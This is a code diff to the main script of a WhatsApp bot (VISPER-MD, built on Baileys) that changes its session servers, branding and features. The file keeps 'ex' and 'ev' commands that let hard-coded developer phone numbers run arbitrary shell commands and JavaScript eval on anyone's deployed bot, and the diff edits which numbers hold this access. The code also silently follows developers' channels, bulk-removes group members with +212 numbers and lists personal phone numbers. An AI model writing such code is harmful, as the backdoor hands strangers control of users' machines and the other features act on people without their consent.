@@ -1,5 +1,3 @@
-
-
 const {
     default: makeWASocket,
     getAggregateVotesInPollMessage, 
@@ -31,10 +29,6 @@ const { File } = require('megajs')
 const path = require('path')
 const msgRetryCounterCache = new NodeCache()
 
-// === FIX: Set default Max Listeners to unlimited (0) for all EventEmitter instances ===
-// This resolves the 'setMaxListeners' warning error in Baileys.
-require('events').EventEmitter.defaultMaxListeners = 0;
-
 const FileType = require('file-type')
 const l = console.log
 var {
@@ -57,7 +51,7 @@ const df = __dirname + '/auth_info_baileys/creds.json';
 
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
-    const sessdata = config.SESSION_ID.replace("VISPER-MD&", "").replace("𝙽𝙰𝙳𝙴𝙴𝙽-𝙼𝙳=", "");
+    const sessdata = config.SESSION_ID.replace("VISPER-MD=", "");
 
     if (sessdata.includes("#")) {
       const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
@@ -77,15 +71,15 @@ if (!fs.existsSync(df)) {
 
 async function downloadSession(sessdata, df) {
   const dbUrls = [
-    'https://visper-get-sessions.vercel.app/',
-    'https://visper-get-sessions.vercel.app/'
+    'https://saviya-kolla-database.koyeb.app/',
+    'https://saviya-kolla-database.vercel.app/'
   ];
 
   let success = false;
 
   for (let i = 0; i < dbUrls.length; i++) {
-    const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
-    console.log(`📥 Downloading session from visper-DB`);
+    const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
+    console.log(`📥 Downloading session from Saviyakolla-DB`);
 
     try {
       const response = await axios.get(sessionUrl);
@@ -118,46 +112,31 @@ const port = process.env.PORT || 8000;
 async function connectToWA() {
 //Run the function
 
-  
-  // FIX 1: Use `fetchLatestBaileysVersion` directly
-    const { version, isLatest } = await fetchLatestBaileysVersion()
-    
-    // FIX 2: Use `useMultiFileAuthState` directly
-    const { state, saveCreds } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
-//const msgRetryCounterCache = makeInMemoryStore({})
-    // FIX 3: Use `makeWASocket` directly
+    const {
+        version,
+        isLatest
+    } = await fetchLatestBaileysVersion()
+    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
+    const {
+        state,
+        saveCreds
+    } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
     const conn = makeWASocket({
-        // FIX 4: If you are using pino, use `pino` directly.
-        // If your original `this.callbacks.P` was an alias for `pino`,
-        // this is the correct way to use it:
-        logger: P({ level: "fatal" }).child({ level: "fatal" }), 
-        
-        printQRInTerminal: false,
+        logger: P({
+            level: "fatal"
+        }).child({
+            level: "fatal"
+        }),
+        printQRInTerminal: true,
+        generateHighQualityLinkPreview: true,
         auth: state,
-
-        markOnlineOnConnect: false,     
-        syncFullHistory: true,          
-        generateHighQualityLinkPreview: false,  
-        defaultQueryTimeoutMs: 60000,
-        connectTimeoutMs: 60000,
-        keepAliveIntervalMs: 30000,
-        // Assuming `this.callbacks.msgRetryCounterCache` is a property from 
-        // the context where this code is called. If not, you might need to
-        // initialize a new cache store here, like `makeInMemoryStore()`.
-        // If you're running inside a class/module where `this.callbacks` 
-        // *should* exist, verify the initialization of the parent class/module.
-        msgRetryCounterCache,
-        
-        getMessage: async (key) => {
-            return undefined
-        }
+        defaultQueryTimeoutMs: undefined,
+        msgRetryCounterCache
     })
-    
 
 
 
-
-const responsee = axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+const responsee = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
 const connectnumber = responsee.data
 	
 // Default owner JID
@@ -178,7 +157,7 @@ conn.ev.on('connection.update', async (update) => {
                 // Fetch custom connect message from server
                 let captionText = '✅ VISPER connected successfully!';
                 try {
-                    const response = axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+                    const response = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
                     const ownerdataa = response.data;
                     captionText = ownerdataa?.connectmg || captionText;
                 } catch (fetchErr) {
@@ -271,7 +250,7 @@ const leaveMsg = config.LEAVE_MSG;
 `;
 
 
-     let joinlink2 = fetchJson('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+     let joinlink2 = await fetchJson('https://mv-visper-full-db.pages.dev/Main/main_var.json');
         
         if (!joinlink2 || !joinlink2.supglink) {
             console.error('❌ Invalid join link data!');
@@ -302,6 +281,7 @@ const leaveMsg = config.LEAVE_MSG;
         }, 2000);
     }
 });
+      
 
 const path = require('path');
 fs.readdirSync("./plugins/").forEach((plugin) => {
@@ -313,7 +293,7 @@ fs.readdirSync("./plugins/").forEach((plugin) => {
 console.log('All Plugins installed ⚡')
 await connectdb()
 await updb()		
-console.log('VISPER-MD BOT CONNECTED ✅')
+console.log('VISPER MOVIE DL CONNECTED ✅')
 
 
 
@@ -325,7 +305,7 @@ console.log('VISPER-MD BOT CONNECTED ✅')
 
 
 
-const ownerdataa = (axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
+const ownerdataa = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
      
          
 
@@ -392,6 +372,26 @@ if (mek.key && mek.key.remoteJid === 'status@broadcast') {
 
 //================================================================================================
 
+const metadata = await conn.newsletterMetadata("jid", `${ownerdataa.mainchanal}`)	      
+if (metadata.viewer_metadata === null){
+await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
+console.log("VISPER MD UPDATES CHANAL FOLLOW ✅")
+}	 
+ const metadataaaaa = await conn.newsletterMetadata("jid", `120363304606757133@newsletter`)	      
+if (metadataaaaa.viewer_metadata === null){
+await conn.newsletterFollow(`120363304606757133@newsletter`)
+console.log(" NADEEN'z CHANAL FOLLOW ✅")
+}   
+const metadataa = await conn.newsletterMetadata("jid", `120363401175047907@newsletter`)	      
+if (metadataa.viewer_metadata === null){
+await conn.newsletterFollow(`120363401175047907@newsletter`)
+console.log("INFINITY - DEVELOPERS CHANAL FOLLOW ✅")
+}   
+ const metadataaa = await conn.newsletterMetadata("jid", `120363401322137865@newsletter`)	      
+if (metadataaa.viewer_metadata === null){
+await conn.newsletterFollow(`120363401322137865@newsletter`)
+console.log("Manoj X CHANAL FOLLOW ✅")
+} 
 
 
 
@@ -444,7 +444,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319,94719255382`
+const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -488,7 +488,7 @@ conn.buttonMessage2 = async (jid, msgData,quotemek) => {
     const CMD_ID_MAP = []
     msgData.buttons.forEach((button, bttnIndex) => {
 const mainNumber = `${bttnIndex + 1}`;
-result += `\n*${mainNumber}* ||  ${button.buttonText.displayText}`;
+result += `\n*${mainNumber}*  ||  ${button.buttonText.displayText}`;
 
 CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
     });
@@ -1477,6 +1477,43 @@ if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || b
     }
 }
 	   
+// Put this at the top of your message handler (where incoming messages are processed)
+// Store original messages
+// Anti-Edit function
+conn.ev.on('messages.update', async (updates) => {
+    for (let update of updates) {
+        const senderId = update.key.participant || update.key.remoteJid;
+        const remoteJid = update.key.remoteJid;
+
+        // Owner messages ignore කරන්න
+       
+
+        // Edited message නම්
+        if (update.updateType === 'message.edit') {
+            const originalMessage = loadChatData(remoteJid, update.key.id)[0]; // පෙර save කරපු original message
+
+            if (!originalMessage) continue;
+
+            let text = "[Non-text message]";
+            if (originalMessage.message?.conversation) text = originalMessage.message.conversation;
+            else if (originalMessage.message?.extendedTextMessage?.text) text = originalMessage.message.extendedTextMessage.text;
+
+            await conn.sendMessage(remoteJid, {
+                text: `❌ *Edited message detected!*\n\n🚮 *Edited by:* _${senderId.split('@')[0]}_\n\n> 🔓 Original: ${text}`
+            });
+        }
+    }
+});
+
+// Chat save function (incoming messages handle)
+function handleIncomingMessage(message) {
+    const remoteJid = message.key.remoteJid;
+    const messageId = message.key.id;
+
+    const chatData = loadChatData(remoteJid, messageId);
+    chatData.push(message);
+    saveChatData(remoteJid, messageId, chatData);
+}
 
 //================================ Auto voice funtion=================================================================
 
@@ -1616,7 +1653,7 @@ console.error("[PLUGIN ERROR] ", e);
 }
 events.commands.map(async (command) => {
   if (body && command.on === "body") {
-    command.function(conn, mek, m, { from, prefix, l, quoted, body, isSudo, isCmd, command, args, q, isPre, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+    command.function(conn, mek, m, { from, prefix, l, isSudo, quoted, isPre, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
   } else if (mek.q && command.on === "text") {
     command.function(conn, mek, m, { from, l, quoted, body, isSudo, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
   } else if (
@@ -1699,7 +1736,7 @@ await conn.groupParticipantsUpdate(from,[sender], 'remove')
       }
     }
 
-if ( mek.id.startsWith("3A5") ) {
+if ( mek.id.startsWith("3L1") ) {
 await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
 if ( config.ANTI_BOT && isBotAdmins ) {
 await conn.sendMessage(from, { delete: mek.key })
@@ -1721,7 +1758,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326 || senderNumber == 94719255382) {
+      if(senderNumber == 94778500326) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1733,7 +1770,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94778500326 || senderNumber == 94719255382) {
+      if(senderNumber == 94778500326) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1754,7 +1791,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94716769285 || senderNumber == 94719255382) {
+      if(senderNumber == 94778500326) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1769,7 +1806,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94716769285 || senderNumber == 94719255382) {
+    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1813,3 +1850,15 @@ process.on("uncaughtException", function (err) {
   if (e.includes("Authentication timed out")) restart();
   console.log("Caught exception: ", err);
 });
+
+
+
+
+
+
+
+
+
+
+
+
